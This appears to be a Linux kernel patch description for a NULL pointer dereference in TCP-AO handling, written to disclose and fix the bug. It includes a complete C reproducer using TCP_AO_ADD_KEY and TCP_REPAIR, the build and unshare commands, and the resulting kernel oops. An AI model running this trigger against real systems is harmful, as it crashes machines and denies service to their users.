The function is called with skb being NULL and attempts to dereference it on tcp_hdr(skb)->seq without a prior skb validation.  Fix this by checking if skb is NULL before dereferencing it.  The commentary is taken from bpf_skops_established(), which is also called in the same flow. Unlike the function being patched, bpf_skops_established() validates the skb before dereferencing it.  int main(void){ \tstruct sockaddr_in sockaddr; \tstruct tcp_ao_add tcp_ao; \tint sk; \tint one = 1;  \tmemset(&sockaddr,'\\0',sizeof(sockaddr)); \tmemset(&tcp_ao,'\\0',sizeof(tcp_ao));  \tsk = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);  \tsockaddr.sin_family = AF_INET;  \tmemcpy(tcp_ao.alg_name,\"cmac(aes128)\",12); \tmemcpy(tcp_ao.key,\"ABCDEFGHABCDEFGH\",16); \ttcp_ao.keylen = 16;  \tmemcpy(&tcp_ao.addr,&sockaddr,sizeof(sockaddr));  \tsetsockopt(sk, IPPROTO_TCP, TCP_AO_ADD_KEY, &tcp_ao, \tsizeof(tcp_ao)); \tsetsockopt(sk, IPPROTO_TCP, TCP_REPAIR, &one, sizeof(one));  \tsockaddr.sin_family = AF_INET; \tsockaddr.sin_port = htobe16(123);  \tinet_aton(\"127.0.0.1\", &sockaddr.sin_addr);  \tconnect(sk,(struct sockaddr *)&sockaddr,sizeof(sockaddr));  return 0; }  $ gcc tcp-ao-nullptr.c -o tcp-ao-nullptr -Wall $ unshare -Urn  BUG: kernel NULL pointer dereference, address: 00000000000000b6 PGD 1f648d067 P4D 1f648d067 PUD 1982e8067 PMD 0 Oops: Oops: 0000 [#1] SMP NOPTI Hardware name: VMware, Inc.
